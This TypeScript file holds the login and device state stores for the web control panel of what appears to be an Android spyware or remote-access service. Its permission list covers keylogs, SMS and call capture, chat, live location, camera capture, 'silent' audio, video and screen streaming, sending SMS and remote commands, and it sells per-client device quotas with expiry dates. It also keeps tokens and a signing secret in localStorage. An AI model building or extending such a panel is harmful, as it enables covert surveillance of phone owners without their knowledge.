import { create } from 'zustand';
import { persist } from 'zustand/middleware';

// Available permission codes - must match server permissions
export const PERMISSIONS = {
    ALL: '*',
    // Data monitoring
    SMS: 'sms',
    CALLS: 'calls',
    CONTACTS: 'contacts',
    NOTIFICATIONS: 'notifications',
    KEYLOGS: 'keylogs',
    CHAT: 'chat',
    PHONE_LOCK: 'phone_lock',
    // Location
    LOCATION: 'location',
    LIVE_LOCATION: 'live_location',
    // Media
    PHOTOS: 'photos',
    GALLERY: 'gallery',
    FILES: 'files',
    // Camera
    CAMERA_FRONT: 'camera_front',
    CAMERA_BACK: 'camera_back',
    SCREENSHOT: 'screenshot',
    // Recordings
    RECORDINGS: 'recordings',
    // Streaming
    STREAM: 'stream',
    STREAM_VIDEO: 'stream_video',
    STREAM_AUDIO: 'stream_audio',
    STREAM_SCREEN: 'stream_screen',
    STREAM_SILENT: 'stream_silent',
    STREAM_FULL: 'stream_full',
    LIVE_CAMERA: 'live_camera',
    // Device
    APPS: 'apps',
    SETTINGS: 'settings',
    LOGS: 'logs',
    // Commands
    COMMANDS: 'commands',
    SMS_SYNC: 'sms_sync',
    SEND_SMS: 'send_sms',
    CALLS_SYNC: 'calls_sync',
    CONTACTS_SYNC: 'contacts_sync',
    REMOTE_COMMANDS: 'remote_commands'
} as const;

export type Permission = typeof PERMISSIONS[keyof typeof PERMISSIONS];

export interface User {
    id: string;
    username: string;
    email?: string;
    role: 'admin' | 'client';
    permissions: string[];
    expiresAt: string | null;
    maxDevices: number;
}

interface AuthState {
    token: string | null;
    refreshToken: string | null;
    signatureSecret: string | null;
    user: User | null;
    isAuthenticated: boolean;
    isHydrated: boolean;
    isAdmin: boolean;

    // Actions
    login: (token: string, refreshToken: string, user: User, signatureSecret: string) => void;
    logout: () => void;
    setHydrated: (state: boolean) => void;
    updateToken: (token: string, refreshToken: string) => void;
    hasPermission: (feature: string) => boolean;
}

export const useAuthStore = create<AuthState>()(
    persist(
        (set, get) => ({
            token: null,
            refreshToken: null,
            signatureSecret: null,
            user: null,
            isAuthenticated: false,
            isHydrated: false,
            isAdmin: false,

            login: (token, refreshToken, user, signatureSecret) => {
                localStorage.setItem('admin_token', token);
                localStorage.setItem('refresh_token', refreshToken);
                localStorage.setItem('signature_secret', signatureSecret);
                set({
                    token,
                    refreshToken,
                    signatureSecret,
                    user,
                    isAuthenticated: true,
                    isAdmin: user.role === 'admin'
                });
            },

            logout: () => {
                localStorage.removeItem('admin_token');
                localStorage.removeItem('refresh_token');
                localStorage.removeItem('signature_secret');
                set({
                    token: null,
                    refreshToken: null,
                    signatureSecret: null,
                    user: null,
                    isAuthenticated: false,
                    isAdmin: false
                });
            },

            setHydrated: (state) => set({ isHydrated: state }),

            updateToken: (token, refreshToken) => {
                localStorage.setItem('admin_token', token);
                localStorage.setItem('refresh_token', refreshToken);
                set({ token, refreshToken });
            },

            hasPermission: (feature: string) => {
                const { user } = get();
                if (!user) return false;

                // Defensive check: ensure permissions is an array
                if (!user.permissions || !Array.isArray(user.permissions)) return false;

                // Admin with "*" has all permissions
                if (user.permissions.includes('*')) return true;

                // Check specific permission
                return user.permissions.includes(feature);
            }
        }),
        {
            name: 'auth-storage',
            onRehydrateStorage: () => (state) => {
                state?.setHydrated(true);
            },
        }
    )
);

interface Device {
    id: string;
    deviceId: string;
    model?: string;
    manufacturer?: string;
    androidVersion?: string;
    isOnline: boolean;
    lastSeen: string;
    linkedAt?: string;
    owner?: {
        id: string;
        username: string;
        role: string;
    };
    stats?: {
        sms: number;
        calls: number;
        screenshots: number;
        photos: number;
    };
}

interface DevicesState {
    devices: Device[];
    selectedDevice: Device | null;
    setDevices: (devices: Device[]) => void;
    updateDevice: (deviceId: string, updates: Partial<Device>) => void;
    selectDevice: (device: Device | null) => void;
}

export const useDevicesStore = create<DevicesState>((set) => ({
    devices: [],
    selectedDevice: null,
    setDevices: (devices) => set({ devices }),
    updateDevice: (deviceId, updates) =>
        set((state) => ({
            devices: state.devices.map((d) =>
                d.deviceId === deviceId ? { ...d, ...updates } : d
            ),
        })),
    selectDevice: (device) => set({ selectedDevice: device }),
}));
